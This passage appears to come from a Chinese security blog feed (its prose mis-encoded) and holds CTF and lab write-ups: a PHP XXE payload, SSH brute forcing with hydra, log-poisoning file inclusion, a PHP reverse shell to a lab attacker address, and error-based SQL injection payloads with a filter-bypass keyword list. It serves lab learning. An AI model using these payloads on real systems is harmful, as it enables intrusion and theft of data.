    <url>/2020/11/16/PHP%E7%9A%84%E4%B8%80%E4%B8%AA%E5%86%85%E7%BD%AE%E7%B1%BB/</url>
    <content><![CDATA[<p>æŸåº—é‡Œæ¯”èµ›é¢˜ç›®ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> $c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$ra,$rb</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        $c = $ra;</span></span><br><span class="line"><span class="comment">//        $c = $rb;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$rc=$_GET[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line">$rb=$_GET[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line">$ra=$_GET[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line">$rd=$_GET[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line">$method= <span class="keyword">new</span> $rc($ra, $rb);</span><br><span class="line">var_dump($method-&gt;$rd());</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶å››ä¸ªå‚æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬æ˜æ˜¾çŸ¥é“ï¼Œè¿™é‡Œçš„Userç±»å®Œå…¨æ²¡æœ‰æ„ä¹‰ï¼Œé¢˜ç›®ç»™å‡ºæç¤ºè®©æˆ‘ä»¬æƒ³æƒ³è¿˜æœ‰ä»€ä¹ˆç±»ï¼Œæƒ³äº†åŠå¤©åº”è¯¥æ˜¯å†…ç½®ç±»ï¼Œé˜Ÿé‡Œçš„w4nderå¸ˆå‚…ç›´æ¥ç»™æˆ‘expäº†ï¼ŒWTMç›´æ¥å¼€èˆ”</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?rc&#x3D;SimpleXMLElement&amp;ra&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php&quot;&gt;]&gt;&lt;x&gt;&amp;xxe;&lt;&#x2F;x&gt;&amp;rb&#x3D;2&amp;rd&#x3D;__toString</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Potatoå’ŒTomatoæ¸—é€</title>
    <url>/2020/11/08/Potato%E5%92%8CTomato%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="Potatoæ¸—é€"><a href="#Potatoæ¸—é€" class="headerlink" title="Potatoæ¸—é€"></a>Potatoæ¸—é€</h1><p>ä¹Ÿæ˜¯ç»å…¸çš„dirbå’Œnmapæ‰«ä¸€æ³¢</p>
<p>nmapçš„ç»“æœ</p>
<p><img src="image-20201108210135725.png" alt="image-20201108210135725"></p>
<p>dirbçš„ç»“æœ</p>
<p><img src="image-20201108210207483.png" alt="image-20201108210207483"></p>
<p>ä¹Ÿå°±å‘ç°äº†ä¸€ä¸ªinfo.phpèƒ½ç”¨ï¼Œè®¿é—®ä¸€äº›æ˜¯phpinfoï¼Œå‘ƒï¼Œé‚£å†çœ‹çœ‹nmapï¼Œå¼€äº†7120ç«¯å£ï¼Œçœ‹çœ‹ï¼Œå•¥éƒ½æ²¡æœ‰ï¼Œåªèƒ½é€šè¿‡hypdraè¿›è¡Œçˆ†ç ´å’¯ï¼Œå‘ƒï¼Œè´¦å·å¯†ç éƒ½ä¸çŸ¥é“ï¼Œåªèƒ½è¯•è¯•çœ‹äº†</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">hydra  192.168.1.113 ssh -s 7120  -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 4 -v -f</span><br></pre></td></tr></table></figure>



<p>ç™»é™†ä¸Šä¹‹åæŸ¥çœ‹uname -a æŸ¥çœ‹èƒ½ä¸èƒ½ææƒ</p>
<p>çœ‹è§å†…æ ¸ä¸ºubuntu3.å¤šï¼Œè¿™ç§è€ç‰ˆæœ¬ä¸€èˆ¬å¯ä»¥ç›´æ¥æï¼Œå°è¯•æœç´¢</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">potato@ubuntu:/tmp$ uname -a</span><br><span class="line">Linux ubuntu 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>searchsploit Ubuntu 3.13.0</p>
<p><img src="image-20201109103119279.png" alt="image-20201109103119279"></p>
<p>åˆ©ç”¨-pæŒ‡ä»¤æ‰¾åˆ°å­˜æ”¾ä½ç½®ï¼Œä¹‹åæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ‹¿ä¸‹expäº†ï¼Œå†ä¸Šä¼ åˆ°é¶æœºçš„tmpç›®å½•ä¸‹ï¼ˆå› ä¸ºtmpç›®å½•å¤§éƒ¨åˆ†æƒ…å†µä¸‹æ˜¯777æƒé™</p>
<p><img src="image-20201109103447331.png" alt="image-20201109103447331"></p>
<p>æˆåŠŸæ‹¿ä¸‹ï¼</p>
<h1 id="Tomatoæ¸—é€"><a href="#Tomatoæ¸—é€" class="headerlink" title="Tomatoæ¸—é€"></a>Tomatoæ¸—é€</h1><p>é¦–å…ˆç»å…¸dribå’Œnmapæ‰«ä¸€æ³¢</p>
<p><img src="image-20201109103819079.png" alt="image-20201109103819079"></p>
<p>nmapï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -v -T4 -Pn -A -p 0-65535</span><br></pre></td></tr></table></figure>

<p><img src="Potato%E5%92%8CTomato%E6%B8%97%E9%80%8F/image-20201109104128465.png" alt="image-20201109104128465"></p>
<p>å‘ç°8888ç«¯å£å’Œ21ï¼Œå¼€äº†å…¶ä»–tcpå’Œsshçš„ç«¯å£,ä½†æ˜¯éƒ½æ²¡æ³•ç”¨ï¼Œåœ¨info.phpä¸‹å‘ç°æ–‡ä»¶åŒ…å«</p>
<p><img src="image-20201109110118801.png" alt="image-20201109110118801"></p>
<p>å°è¯•åŒ…å«äº†ä¸€ä¸‹etc/passwdå°±å¡ä½äº†ï¼Œä¸çŸ¥é“è¯¥æ€ä¹ˆåšã€‚ã€‚</p>
<hr>
<p>è¿™é‡Œè®°å½•ä¸‹å„ä¸ªlogçš„æ–‡ä»¶</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">9)/var/run/utmp è®°å½•ç€ç°åœ¨ç™»å½•çš„ç”¨æˆ·;</span><br><span class="line">10)/var/log/lastlog è®°å½•æ¯ä¸ªç”¨æˆ·æœ€åçš„ç™»å½•ä¿¡æ¯;</span><br><span class="line">11)/var/log/btmp è®°å½•é”™è¯¯çš„ç™»å½•å°è¯•;</span><br><span class="line">12)/var/log/dmesgå†…æ ¸æ—¥å¿—;</span><br><span class="line">13)/var/log/cpus CPUçš„å¤„ç†ä¿¡æ¯ï¼›</span><br><span class="line">14)/var/log/syslog äº‹ä»¶è®°å½•ç›‘æ§ç¨‹åºæ—¥å¿—ï¼›</span><br><span class="line">15)/var/log/auth.log ç”¨æˆ·è®¤è¯æ—¥å¿—ï¼›</span><br><span class="line">16)/var/log/daemon.log ç³»ç»Ÿè¿›ç¨‹æ—¥å¿—ï¼›</span><br><span class="line">17)/var/log/mail.err é‚®ä»¶é”™è¯¯ä¿¡æ¯ï¼›</span><br><span class="line"></span><br><span class="line">18)/var/log/mail.info é‚®ä»¶ä¿¡æ¯ï¼›</span><br><span class="line"></span><br><span class="line">19)/var/log/mail.warn é‚®ä»¶è­¦å‘Šä¿¡æ¯ï¼›</span><br><span class="line">20)/var/log/daemon.log ç³»ç»Ÿç›‘æ§ç¨‹åºäº§ç”Ÿçš„ä¿¡æ¯;</span><br><span class="line">21)/var/log/kern å†…æ ¸äº§ç”Ÿçš„ä¿¡æ¯;</span><br><span class="line">22)/var/log/lpr   è¡Œæ‰“å°æœºå‡è„±æœºç³»ç»Ÿäº§ç”Ÿçš„ä¿¡æ¯;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ ¹æ®å¤§ä½¬çš„payloadï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œåœ¨å½“å‰ç¯å¢ƒä¸‹æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„logæ–‡ä»¶åªæœ‰auth.log,å› ä¸ºåªæœ‰ä¸ªè¿™ä¸ªæ—¥å¿—æˆ‘ä»¬å¯ä»¥æ“ä½œï¼Œæ¯”å¦‚æˆ‘ä»¬å†™å…¥ä¸€å¥è¯ï¼Œå†è¿›è¡ŒåŒ…å«çš„è¯ï¼Œä¸å°±æ˜¯æ‰§è¡Œäº†å‘½ä»¤äº†å—ï¼ˆ<strong>è¿™ä¸ªæ€è·¯çœŸçš„éªš</strong></p>
<p>æ‰€ä»¥æˆ‘ä»¬é©¬ä¸Šæ“ä½œä¸€æ³¢ï¼Œè¿™é‡Œæˆ‘ç”¨xshellè„¸ä¸ŠÂ·çš„</p>
<p><img src="image-20201109113724842.png" alt="image-20201109113724842"></p>
<p>é©¬ä¸Šæ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;192.168.29.131&#x2F;antibot_image&#x2F;antibots&#x2F;info.php?image&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;cmd&#x3D;ls</span><br></pre></td></tr></table></figure>

<p><img src="image-20201109113800161.png" alt="image-20201109113800161"></p>
<p>å†ä¹‹åä¸ºäº†èƒ½å¤Ÿä¼ è„šæœ¬å•¥çš„å•Šï¼Œæˆ‘ä»¬æ‰§è¡Œä¸€æ³¢åå¼¹shellï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.29.129&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p>urlencodeä¸€ä¸‹</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php%20-r%20&#x27;%24sock%3Dfsockopen(%22192.168.29.129%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B&#x27;</span><br></pre></td></tr></table></figure>

<p>å¼¹åˆ°è‡ªå·±æœ¬æœºä¸Šå³å¯ã€‚</p>
<p><img src="image-20201109113953687.png" alt="image-20201109113953687"></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬æ±‚ä¸€ä¸ªäº¤äº’å¼çš„shellï¼Œå‘ç°python3å¯ä»¥ç”¨ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥ç”¨Pythonæ‰“å¼€ä¸€ä¸ªäº¤äº’å¼çš„shell</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p>ä¹‹åuname -a çœ‹å†…æ ¸ï¼Œexpä¸€å†²å°±å®Œäº‹äº†</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">grep -nr &quot;flag&#123;&quot; / 2&gt;/dev/null   æˆ‘ä»–å¦ˆç›´æ¥ä¸€æŠŠæ¢­</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF2015EasySQL</title>
    <url>/2020/11/18/RCTF2015EasySQL/</url>
    <content><![CDATA[<h1 id="è€ƒç‚¹ï¼š"><a href="#è€ƒç‚¹ï¼š" class="headerlink" title="è€ƒç‚¹ï¼š"></a>è€ƒç‚¹ï¼š</h1><p>ä¸€ä¸ªSQLæ³¨å…¥ï¼ŒäºŒæ¬¡æ³¨å…¥+æŠ¥é”™æ³¨å…¥</p>
<p>å½“æˆ‘ä»¬æ³¨å†Œç”¨æˆ·ä¿®æ”¹å¯†ç çš„æ—¶å€™ä¾¿ä¼šè§¦å‘</p>
<h1 id="è¿‡ç¨‹ï¼š"><a href="#è¿‡ç¨‹ï¼š" class="headerlink" title="è¿‡ç¨‹ï¼š"></a>è¿‡ç¨‹ï¼š</h1><p>æˆ‘ä»¬å¯ä»¥æµ‹è¯•ä¸€ä¸‹è¢«è¿‡æ»¤äº†ä»€ä¹ˆï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">length </span><br><span class="line">+</span><br><span class="line">handler</span><br><span class="line">like</span><br><span class="line">select </span><br><span class="line">sleep</span><br><span class="line">database</span><br><span class="line">delete</span><br><span class="line">having</span><br><span class="line">or</span><br><span class="line">as</span><br><span class="line">-~</span><br><span class="line">BENCHMARK</span><br><span class="line">limit</span><br><span class="line">left</span><br><span class="line">select</span><br><span class="line">insert</span><br><span class="line">sys.schema_auto_increment_columns</span><br><span class="line">join</span><br><span class="line">right</span><br><span class="line">#</span><br><span class="line">&amp;</span><br><span class="line">&amp;&amp;</span><br><span class="line">\</span><br><span class="line">handler</span><br><span class="line">-- -</span><br><span class="line">--</span><br><span class="line">--+</span><br><span class="line">INFORMATION</span><br><span class="line">--</span><br><span class="line">;</span><br><span class="line">!</span><br><span class="line">%</span><br><span class="line">+</span><br><span class="line">xor</span><br><span class="line">&lt;&gt;</span><br><span class="line">(</span><br><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">)</span><br><span class="line">.</span><br><span class="line">^</span><br><span class="line">=</span><br><span class="line">AND</span><br><span class="line">BY</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">COUNT</span><br><span class="line">CREATE</span><br><span class="line">END</span><br><span class="line">case</span><br><span class="line">&#x27;1&#x27;=&#x27;1</span><br><span class="line">when</span><br><span class="line">admin&#x27;</span><br><span class="line">&quot;</span><br><span class="line">length </span><br><span class="line">+</span><br><span class="line">length</span><br><span class="line">REVERSE</span><br><span class="line"></span><br><span class="line">ascii</span><br><span class="line">select </span><br><span class="line">database</span><br><span class="line">left</span><br><span class="line">right</span><br><span class="line">&#x27;</span><br><span class="line">union</span><br><span class="line">||</span><br><span class="line">oorr</span><br><span class="line">/</span><br><span class="line">//</span><br><span class="line">//*</span><br><span class="line">*/*</span><br><span class="line">/**/</span><br><span class="line">anandd</span><br><span class="line">GROUP</span><br><span class="line">HAVING</span><br><span class="line">IF</span><br><span class="line">INTO</span><br><span class="line">JOIN</span><br><span class="line">LEAVE</span><br><span class="line">LEFT</span><br><span class="line">LEVEL</span><br><span class="line">sleep</span><br><span class="line">LIKE</span><br><span class="line">NAMES</span><br><span class="line">NEXT</span><br><span class="line">NULL</span><br><span class="line">OF</span><br><span class="line">ON</span><br><span class="line">|</span><br><span class="line">infromation_schema</span><br><span class="line">user</span><br><span class="line">OR</span><br><span class="line">ORDER</span><br><span class="line">ORD</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">UPDATE</span><br><span class="line">USER</span><br><span class="line">USING</span><br><span class="line">VALUE</span><br><span class="line">VALUES</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">ADD</span><br><span class="line">AND</span><br><span class="line">prepare</span><br><span class="line">set</span><br><span class="line">update</span><br><span class="line">delete</span><br><span class="line">drop</span><br><span class="line">inset</span><br><span class="line">CAST</span><br><span class="line">COLUMN</span><br><span class="line">CONCAT</span><br><span class="line">GROUP_CONCAT</span><br><span class="line">group_concat</span><br><span class="line">CREATE</span><br><span class="line">DATABASE</span><br><span class="line">DATABASES</span><br><span class="line">alter</span><br><span class="line">DELETE</span><br><span class="line">DROP</span><br><span class="line">floor</span><br><span class="line">rand()</span><br><span class="line">information_schema.tables</span><br><span class="line">TABLE_SCHEMA</span><br><span class="line">%df</span><br><span class="line">concat_ws()</span><br><span class="line">concat</span><br><span class="line">LIMIT</span><br><span class="line">ORD</span><br><span class="line">ON</span><br><span class="line">extractvalue</span><br><span class="line">order </span><br><span class="line">CAST()</span><br><span class="line">by</span><br><span class="line">ORDER</span><br><span class="line">OUTFILE</span><br><span class="line">RENAME</span><br><span class="line">REPLACE</span><br><span class="line">SCHEMA</span><br><span class="line">SELECT</span><br><span class="line">SET</span><br><span class="line">updatexml</span><br><span class="line">SHOW</span><br><span class="line">SQL</span><br><span class="line">TABLE</span><br><span class="line">THEN</span><br><span class="line">TRUE</span><br><span class="line">instr</span><br><span class="line">benchmark</span><br><span class="line">format</span><br><span class="line">bin</span><br><span class="line">substring</span><br><span class="line">ord</span><br><span class="line"></span><br><span class="line">UPDATE</span><br><span class="line">VALUES</span><br><span class="line">VARCHAR</span><br><span class="line">VERSION</span><br><span class="line">WHEN</span><br><span class="line">WHERE</span><br><span class="line">/*</span><br><span class="line">`</span><br><span class="line">  </span><br><span class="line">,</span><br><span class="line">users</span><br><span class="line">%0a</span><br><span class="line">%0b</span><br><span class="line">mid</span><br><span class="line">for</span><br><span class="line">BEFORE</span><br><span class="line">REGEXP</span><br><span class="line">RLIKE</span><br><span class="line">in</span><br><span class="line">sys schemma</span><br><span class="line">SEPARATOR</span><br><span class="line">XOR</span><br><span class="line">CURSOR</span><br><span class="line">FLOOR</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">INFILE</span><br><span class="line">count</span><br><span class="line">%0c</span><br><span class="line">from</span><br><span class="line">%0d</span><br><span class="line">%a0</span><br><span class="line">=</span><br><span class="line">@</span><br><span class="line">else</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ç”¨åˆ«äººçš„å­—å…¸æ¥æŸ¥ä¸€ä¸‹</p>
<p>å¤§æ¦‚å¯¹æˆ‘ä»¬æ³¨å…¥æœ‰å½±å“çš„åªæœ‰ç©ºæ ¼ï¼Œselectçš„è¯æˆ‘ä»¬å¯ä»¥ç”¨å¤§å°å†™çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œäºæ˜¯å»mysqlé‡Œé¢å°è¯•æ„é€ å‡ºè¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;</span><br><span class="line">mysql&gt; select * from websites where id &#x3D;1 and(select updatexml(1,concat(&#39;~&#39;,(select(database()))),1));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;</span><br><span class="line">mysql&gt; select * from websites where id &#x3D;1 and(select(updatexml(1,concat(&#39;~&#39;,(select(database()))),1)));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~runoob&#39;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æ³¨å…¥è¯­å¥ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">admin&quot;^(select(updatexml(1,concat(&#x27;~&#x27;,(select(database()))),1)))#</span><br><span class="line">#XPATH syntax error: &#x27;~web_sqli&#x27;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æ•°æ®åº“çš„åå­—.</p>
<p>ä¸‹ä¸€æ­¥è·å–è¡¨åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;^(select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)))#</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯ä¼šæŠ¥é”™ï¼ŒSubquery returns more than 1 rowï¼Œå› ä¸ºä¸æ­¢ä¸€ä¸ªè¡¨ï¼Œé‚£æˆ‘ä»¬æ·»åŠ group_concatå‡½æ•°</p>
<p>åœ¨mysqlä¸­æµ‹è¯•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));</span><br><span class="line">ERROR 1242 (21000): Subquery returns more than 1 row</span><br><span class="line">mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));</span><br><span class="line">ERROR 2013 (HY000): Lost connection to MySQL server during query</span><br><span class="line">mysql&gt; select * from student where STID&#x3D;1 and (select(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database()))),0x7e)));</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è¡¨åï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~article,flag,users&#x27;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæå‰å‰§é€ä¸€ä¸‹ï¼Œflagè¡¨çš„ä¸œè¥¿æ˜¯å‡flagï¼Œçº¯ç²¹ä½œè€…æå¿ƒæ€çš„ï¼Œæˆ‘ä¸€ç›´è§‰å¾—è¿™ç§ä¸œè¥¿å¾ˆå¤šä½™å¥½å§ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~STID,STNAME,STSEX,STAGE,STPHONE&#39;</span><br><span class="line">mysql&gt; select * from student WHERE STID&#x3D;1 and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;student&quot;)),0x7e));</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å­—æ®µåï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~name,pwd,email,real_flag_1s_her&#x27;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå…¶å®æˆ‘ä»¬å°±å¯ä»¥å‘ç°ä¸€ä¸ªä¸æ–¹ä¾¿çš„åœ°æ–¹äº†ï¼ŒæŠ¥é”™æ³¨å…¥çš„å›æ˜¾æ˜¯æœ‰é™çš„ï¼Œæ‰€ä»¥è¿™é‡Œåé¢åº”è¯¥æ˜¯hereï¼Œå´æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥</p>
<p>æ³¨å…¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot;^(select(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users))),0x7e)))#</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°çš„ä¸œè¥¿å¾ˆå¥‡æ€ªï¼š</p>
<p>~xxxx,xxx,xxxä»€ä¹ˆçš„ï¼Œè¿™å°±å¾ˆæ¶å¿ƒäººäº†ï¼Œäºæ˜¯æˆ‘ä»¬å°è¯•ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥åŒ¹é…æˆ‘ä»¬éœ€è¦çš„æ•°æ®</p>
<p>åˆ«äººçš„è¯­å¥ï¼š</p>
